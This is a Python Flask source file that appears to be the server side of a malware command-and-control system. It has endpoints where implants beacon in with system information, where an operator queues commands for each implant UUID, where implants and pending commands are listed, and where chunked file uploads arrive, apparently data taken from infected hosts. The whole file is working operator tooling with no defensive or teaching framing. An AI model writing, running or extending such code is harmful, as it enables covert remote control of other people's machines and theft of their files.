from flask import Blueprint, request, jsonify
from app.api import services

import logging

logging.basicConfig(level=logging.DEBUG)

BP = Blueprint("api", __name__, url_prefix="/api/v1")


@BP.route("/beacon", methods=["POST"])
def beacon():
    data = request.get_json()
    timestamp = data.get("timestamp")
    implant_uuid = data.get("uuid")
    system_info = data

    logging.info(
        f"Received beacon from {implant_uuid} at {timestamp} seconds: {system_info}"
    )

    command_response = services.process_beacon(implant_uuid)
    return jsonify(command_response)


@BP.route("/command", methods=["POST"])
def command():
    data = request.get_json()
    command_text = data.get("command")
    implant_uuid = data.get("uuid")

    if not command_text or not implant_uuid:
        return jsonify({"status": "Invalid command or UUID"}), 400

    result = services.add_command_to_queue(implant_uuid, command_text)
    if result:
        return jsonify({"message": "Command added to queue successfully"}), 200
    else:
        return jsonify({"message": "Given UUID is not in use."}), 404


@BP.route("/uuids", methods=["GET"])
def list_uuids():
    uuids = services.list_all_uuids()
    return jsonify(uuids)


@BP.route("/commands/<uuid>", methods=["GET"])
def get_commands(uuid):
    commands = services.get_commands_for_uuid(uuid)
    if commands is None:
        return jsonify({"message": "No commands found"}), 404
    return jsonify(commands)


@BP.route("/file", methods=["POST"])
def file_chunk():
    data = request.get_json()
    implant_uuid = data.get("uuid")
    file_id = data.get("file_id")
    chunk_index = data.get("chunk_index")
    chunk_data = data.get("chunk_data")

    if not (implant_uuid and file_id and chunk_index is not None and chunk_data):
        return jsonify({"status": "Invalid data"}), 400

    services.save_file_chunk(implant_uuid, file_id, chunk_index, chunk_data)
    return jsonify({"status": "Chunk received"}), 200
